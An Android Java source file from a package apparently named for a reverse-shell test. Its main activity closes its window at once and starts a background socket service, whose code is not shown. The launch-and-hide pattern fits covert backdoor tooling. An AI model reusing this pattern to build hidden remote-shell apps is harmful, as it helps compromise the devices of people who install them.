package com.example.reverseshelltest;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;


public class MainActivity extends Activity {

    private static Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        MainActivity.context = getBaseContext();
        setContentView(R.layout.activity_main);
        this.finish();
        startService(new Intent(this,SocketService.class));
    }

    public static Context getAppContext() {
        return MainActivity.context;
    }


}